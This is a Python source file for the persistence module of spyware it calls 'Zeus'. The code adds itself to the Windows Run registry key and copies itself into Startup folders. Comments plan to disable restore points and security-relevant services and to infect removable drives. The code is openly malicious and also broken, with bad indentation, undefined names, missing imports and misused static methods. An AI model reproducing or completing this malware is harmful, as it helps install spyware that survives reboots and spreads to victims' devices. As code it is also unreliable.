from shutil import copyfile

class BootPersistanceHandler(object):
    WINDOWS_START_UP_FOLDER_PREFIX = ""
    WINDOWS_START_UP_FOLDER_SUFFIX = r"\Start Menu\Programs\StartUp"
    WINDOWS_ALTERNATIVE_START_UP_FOLDER_SUFFIX = r"\AppData\Roaming\Microsoft\Windows\Start"

    START_MENU = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

    WINDOWS_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
    WINDOWS_ALTERNATIVE_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"

    isWindows = False

    @staticmethod
    def addSelfToSystemToBoot(self, isWindows=None):
        if isWindows:
            # 1. Use registry
            self.implantToRegistry()

            # 2. Copy file manually
            copyFilesManually()

            # 3. Disable restore points
            # 4. Disable windows services which can interfer propy injection to device
            # 5. Constantly check if removable devices is connected and if yes -
            # infect them as well (make spyware startup from removable device)

    @staticmethod
    def implantToRegistry(self):
        global CheckRegistryKey, keyCheck, setRegistryValue
        try:
            registryKey = CheckRegistryKey(WINDOWS_REGISTRY_START_UP_PATH, "Zeus", os.path.abspath(__file__))
            if registryKey:
                keyCheck = registryKey[0]

            if keyCheck == 1:
                print("Zeus already installed!")
            else:
                print("Implanting Zeus to windows registry")

            didSetRunKey = setRegistryValue(WINDOWS_REGISTRY_START_UP_PATH, os.path.abspath(__file__))

            if not didSetRunKey:
                print("Error adding Zeus to windows registry run key.")
        except ex:
            print(ex)

    def setRegistryValue(name, value):
        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
              winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
              winreg.CloseKey(registry_key)

              return True
        except WindowsError:
              return False

    def CheckRegistryKey(location, softwareName, keyName):
         try:
             aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
             aKey = OpenKey(aReg, location)
        except ex:
            print(ex)
            return False

        try:
            aSubKey = OpenKey(aKey, softwareName)
            val = QueryValueEx(aSubKey, keyName)

            if val:
                return True
            else:
                return False

        except EnvironmentError:
            print(EnvironmentError)
            return False


    def copyFilesManually(self):
        # Copy to 1st directory
        destinationFolder = r"%s%s" % (WINDOWS_START_UP_FOLDER_PREFIX, WINDOWS_START_UP_FOLDER_SUFFIX)
        filePath = r"%s\%s" % (destinationFolder, os.path.abspath(__file__))

        if not os.path.isfile(filePath):
            copyfile(os.path.abspath(__file__), destinationFolder)

        # Copy to 2nd directory
        destinationFolder = r"%s%s" % (
            WINDOWS_START_UP_FOLDER_PREFIX, WINDOWS_ALTERNATIVE_START_UP_FOLDER_SUFFIX)
        filePath = r"%s\%s" % (destinationFolder, os.path.abspath(__file__))

        if not os.path.isfile(filePath):
            copyfile(os.path.abspath(__file__), destinationFolder)

    isWindows = (platform.system().lower() == "Windows".lower())

    if isWindows:
        import winreg

        WINDOWS_START_UP_FOLDER_PREFIX = os.environ['WINDIR']
